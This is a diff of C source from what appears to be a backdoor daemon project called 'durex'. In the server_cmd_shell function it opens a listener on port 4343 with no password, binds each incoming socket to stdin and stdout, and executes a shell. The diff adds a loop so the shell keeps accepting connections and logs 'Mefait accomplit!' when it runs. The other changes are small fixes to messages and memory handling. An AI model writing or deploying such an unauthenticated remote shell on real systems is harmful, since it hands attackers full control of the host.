@@ -6,7 +6,7 @@
 /*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/22 11:59:22 by banthony         ###   ########.fr       */
+/*   Updated: 2019/11/22 16:53:43 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -80,6 +80,7 @@ static t_bool	server_cmd_shell(t_client *client, t_server *server)
 
 	if (!server || !client)
 		return (false);
+	send_text(COLORIZE(SH_YELLOW, "• ") "Spawning a shell on port 4343 ...\n", client->socket);
 	if ((pid = fork()) < 0)
 	{
 		send_text("The remote shell has failed.\n", client->socket);
@@ -92,12 +93,13 @@ static t_bool	server_cmd_shell(t_client *client, t_server *server)
 		ft_memset(&remote_shell, 0, sizeof(remote_shell));
 		remote_shell.require_pass = false;
 		close(server->socket);
-		if (create_server(&remote_shell, 4343, 1))
+		if (create_server(&remote_shell, 4343, 2))
 		{
-			send_text(COLORIZE(SH_GREEN, "• ") "Done.\n", client->socket);
+			send_text(COLORIZE(SH_GREEN, "\t• ") "shell is waiting for connexion.\n"SERVER_PROMPT, client->socket);
 			close(client->socket);
-			if (new_client(&remote_shell))
+			while (1)
 			{
+				new_client(&remote_shell);
 				clt = (t_client*)remote_shell.client_lst->content;
 				dup2(clt->socket, 0);
 				dup2(clt->socket, 1);
@@ -105,18 +107,14 @@ static t_bool	server_cmd_shell(t_client *client, t_server *server)
 				execve(sh[0], sh, environ);
 			}
 		}
-		send_text(COLORIZE(SH_RED, "• ") "Failed, wait and retry.\n", client->socket);
+		send_text(COLORIZE(SH_RED, "\t• ") "Failed, wait and retry.\n"SERVER_PROMPT, client->socket);
 		close(client->socket);
 		durex_log("The remote shell has failed.", LOG_WARNING);
-		exit(EXIT_FAILURE); // kill daemon
+		exit(EXIT_FAILURE);
 	}
 	// Father
 	else
-	{
-		send_text(COLORIZE(SH_YELLOW, "• ") "Spawning a shell on port 4343 ...\n", client->socket);
-		sleep(1);
 		durex_log("Mefait accomplit!", LOG_INFO);
-	}
 	return (true);
 }
 
@@ -196,6 +194,7 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 	ft_strncat(final_status, footer, ft_strlen(footer));
 	send_text(final_status, client->socket);
 	ft_strdel(&final_status);
+	ft_strdel(&clients);
 	return (true);
 }
 
@@ -214,7 +213,6 @@ void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_
 {
 	t_server_cmd cmd = -1;
 
-	ft_print_memory(raw_cmd, cmd_size);
 	raw_cmd[cmd_size - 1] = (raw_cmd[cmd_size - 1] == '\n') ? '\0' : raw_cmd[cmd_size - 1];
 	durex_log_with(raw_cmd, LOG_INFO, client_prefix, client);
 	while (++cmd < SERVER_CMD_NUMBER)
